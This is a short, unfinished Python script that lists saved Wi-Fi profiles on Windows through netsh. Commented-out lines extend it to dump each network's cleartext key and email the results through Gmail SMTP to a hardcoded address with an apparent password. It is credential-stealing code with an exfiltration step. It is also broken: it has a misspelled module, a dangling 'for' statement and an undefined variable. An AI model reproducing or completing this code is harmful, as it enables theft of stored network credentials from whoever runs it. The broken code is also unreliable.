import smtplib,subprocess,re


def sendMail(email,password,message):
    server = smptlib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def getWifi():
    wifiNetworks = []
    wlanProfile = 'netsh wlan show profile'
    wlanProfile = subprocess.check_output(wlanProfile,shell=True)
    wlanProfile = wlanProfile.decode()
    #print(wlanProfile)
    if 'Profile' in str(wlanProfile):
        netNames = re.compile('(Profile\s*:\s)(.*)')
        netNames = re.findall(netNames,str(wlanProfile))
        for profile in netNames:
            print(profile[1])
            wifiNetworks.append(profile[1])
            for profile = 
    return wifiNetworks

print(getWifi())
# for network in getWifi():
#     print(network)
#     cmd = 'netsh wlan show profile ' + network + ' key=clear'
#     print(cmd)
    
    #password = subprocess.check_output('netsh wlan show profile ' + network + ' key=clear')



#sendMail('benpro4433@gmail.com','burn3rp4ss',result)

